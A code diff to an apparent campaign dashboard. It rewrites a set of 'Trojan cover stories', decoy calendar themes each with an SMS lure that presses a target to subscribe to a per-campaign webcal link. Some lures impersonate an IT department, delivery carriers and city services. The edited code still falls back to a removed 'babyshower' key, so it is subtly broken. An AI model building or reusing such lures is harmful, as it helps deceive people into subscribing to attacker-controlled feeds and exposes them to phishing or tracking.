@@ -606,14 +606,13 @@
                 1. Select Cover Story Theme:
               </div>
               <div style="display:flex; flex-wrap:wrap; gap:6px;" id="themePills-${camp.id}">
-                <button type="button" class="theme-pill active" onclick="selectInviteTheme('${camp.id}', 'babyshower', this)">🍼 Baby Shower</button>
-                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'wedding', this)">💍 Wedding</button>
-                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'fantasy', this)">🏈 Fantasy Sports</button>
-                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'dental', this)">🦷 Dental Clinic</button>
-                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'delivery', this)">📦 Delivery Sync</button>
-                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'corporate', this)">💻 Corporate IT</button>
-                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'flight', this)">✈️ Flight Alert</button>
+                <button type="button" class="theme-pill active" onclick="selectInviteTheme('${camp.id}', 'event', this)">💌 Event Invite</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'shared', this)">📅 Shared Calendar</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'trip', this)">✈️ Trip Itinerary</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'delivery', this)">📦 Delivery Tracking</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'directory', this)">📱 Mobile IT Sync</button>
                 <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'trash', this)">🗑️ City Services</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'custom', this)">✍️ Custom Story</button>
               </div>
             </div>
 
@@ -1192,69 +1191,61 @@
 
     // Preset Trojan Cover Stories for Multicast Sharing
     const DASHBOARD_DECOYS = {
-      babyshower: {
-        name: "Baby Shower",
-        calName: "Sophia's Baby Shower & Registry Updates",
-        title: "🍼 Sophia & Mark's Baby Shower (RSVP Confirmed)",
-        location: "Oak Ridge Pavilion • Room B",
-        memo: "Venue: Oak Ridge Pavilion. Gift registry items and schedule updates syncing to device.",
-        sms: "Hey! Here's the shared calendar for the baby shower & registry deadlines, subscribe so you have all the dates handy: {URL}"
+      event: {
+        name: "Event Invite",
+        calName: "Event Invitation & Schedule",
+        title: "🎉 Event Invitation & Schedule Updates",
+        location: "Event Location",
+        memo: "Event schedule and itinerary updates syncing directly to device.",
+        sms: "Here's the invite so you don't have to stress about dates or times! Add it to your calendar: {URL}"
       },
-      wedding: {
-        name: "Wedding",
-        calName: "Miller & Davis Wedding Itinerary",
-        title: "💍 Wedding Rehearsal Dinner & Ceremony",
-        location: "The Grand Estate Ballroom",
-        memo: "Formal wedding weekend itinerary and rehearsal dinner schedule syncing to device.",
-        sms: "Here is the shared wedding weekend itinerary calendar so everyone stays on schedule: {URL}"
+      shared: {
+        name: "Shared Calendar",
+        calName: "Shared Calendar Sync",
+        title: "📅 Shared Group Calendar & Schedule",
+        location: "Shared Feed",
+        memo: "Shared group schedule and calendar updates syncing to device.",
+        sms: "Hey! Add this shared calendar link to your phone so you have the schedule: {URL}"
       },
-      fantasy: {
-        name: "Fantasy Sports",
-        calName: "2026 Fantasy League Draft & Matchups",
-        title: "🏈 League Draft Party & Week 1 Kickoff",
-        location: "Draft Room Live",
-        memo: "League matchups and waiver wire deadlines syncing. Draft order finalized.",
-        sms: "Yo, here's the fantasy league draft and matchup sync link for your calendar, add it so you don't miss kickoff: {URL}"
-      },
-      dental: {
-        name: "Dental Care",
-        calName: "Family Health Portal Sync",
-        title: "🦷 Dental Cleaning & Exam Check-in",
-        location: "Suite 400 • Medical Plaza",
-        memo: "Automated patient appointment sync. Arrive 15 minutes prior with insurance card.",
-        sms: "Appointment Sync: Please add this shared appointment calendar to your device to confirm check-in times and instructions: {URL}"
+      trip: {
+        name: "Trip Itinerary",
+        calName: "Trip Itinerary & Schedule",
+        title: "✈️ Trip Schedule & Itinerary Updates",
+        location: "Destination",
+        memo: "Shared trip schedule, arrival windows, and itinerary updates syncing to device.",
+        sms: "Here's our shared trip itinerary and schedule! Add it to your phone so you have all the times: {URL}"
       },
       delivery: {
-        name: "Delivery Sync",
-        calName: "Priority Package Dispatch",
-        title: "📦 Amazon / FedEx Priority Package Delivery",
-        location: "Front Porch / Gate Access",
-        memo: "Automated delivery tracking feed. Live dispatch window updates streaming to calendar.",
-        sms: "Delivery Alert: Live tracking updates for your package delivery have been dispatched. Sync to your calendar here: {URL}"
+        name: "Delivery Tracking",
+        calName: "Delivery Tracking Sync",
+        title: "📦 Express Delivery & Tracking Window",
+        location: "Delivery Address",
+        memo: "Delivery arrival window and carrier tracking updates streaming to device.",
+        sms: "Hey, tracking updates for the delivery are here, subscribe to add the delivery window to your calendar: {URL}"
       },
-      corporate: {
-        name: "Corporate IT",
+      directory: {
+        name: "Mobile IT Sync",
         calName: "Mobile Directory Sync",
-        title: "📱 Enterprise Directory Verification",
-        location: "Corporate Security Gateway",
-        memo: "Routine enterprise directory sync for secure mobile access.",
-        sms: "System Security Notice: Please complete mobile calendar directory synchronization by adding this verified feed: {URL}"
-      },
-      flight: {
-        name: "Flight Alert",
-        calName: "Airline Travel Schedule",
-        title: "✈️ Flight Gate Tracking & Boarding Group",
-        location: "Terminal 2 • Gate B14",
-        memo: "Automated flight status and gate tracking feed syncing directly to calendar.",
-        sms: "Here's our shared flight itinerary and gate tracking calendar! Add it to your phone so you get automatic updates: {URL}"
+        title: "📱 Enterprise Directory Verification (Active)",
+        location: "System Services",
+        memo: "Mobile device registered to secure directory synchronization. Routine periodic sync active.",
+        sms: "Per IT memo: Please subscribe to this directory link from your phone to complete your mobile profile verification: {URL}"
       },
       trash: {
         name: "City Services",
         calName: "City Utility & Services Sync",
-        title: "🗑️ Bi-Weekly Bulk Trash & Recycling Pickup",
-        location: "Curbside",
-        memo: "Municipal sanitation and bulk recycling schedule syncing to residential address.",
-        sms: "Here is the neighborhood bulk trash and recycling pickup schedule calendar feed for your phone: {URL}"
+        title: "🗑️ Municipal Services & Utility Schedule",
+        location: "Residential Address",
+        memo: "Municipal sanitation and utility schedule syncing to residential address.",
+        sms: "Hey, here is the neighborhood utility and services schedule link for your phone: {URL}"
+      },
+      custom: {
+        name: "Custom Story",
+        calName: "Event Schedule",
+        title: "📅 Calendar Event & Schedule",
+        location: "Location",
+        memo: "Calendar event details and schedule updates.",
+        sms: "Hey, here's the invite link so you can add it to your calendar: {URL}"
       }
     };
 
@@ -1272,7 +1263,7 @@
       drawer.style.display = isClosed ? "block" : "none";
 
       if (isClosed) {
-        if (!ACTIVE_INVITE_THEMES[cid]) ACTIVE_INVITE_THEMES[cid] = "babyshower";
+        if (!ACTIVE_INVITE_THEMES[cid]) ACTIVE_INVITE_THEMES[cid] = "event";
         updateInviteScript(cid);
         drawer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
       }
@@ -1303,7 +1294,7 @@
     }
 
     function getInvitePortalUrl(cid) {
-      const theme = ACTIVE_INVITE_THEMES[cid] || "babyshower";
+      const theme = ACTIVE_INVITE_THEMES[cid] || "event";
       const whoInput = document.getElementById(`inviteWhoInput-${cid}`);
       const who = whoInput ? whoInput.value.trim() : "";
       const base = `${window.location.origin}${window.location.pathname.replace(/[^/]*$/, '')}join.html?cid=${cid}&theme=${theme}`;
@@ -1319,7 +1310,7 @@
     }
 
     function updateInviteScript(cid) {
-      const theme = ACTIVE_INVITE_THEMES[cid] || "babyshower";
+      const theme = ACTIVE_INVITE_THEMES[cid] || "event";
       const preset = DASHBOARD_DECOYS[theme] || DASHBOARD_DECOYS.babyshower;
       const portalUrl = getInvitePortalUrl(cid);
       const webcalUrl = getInviteWebCalUrl(cid);
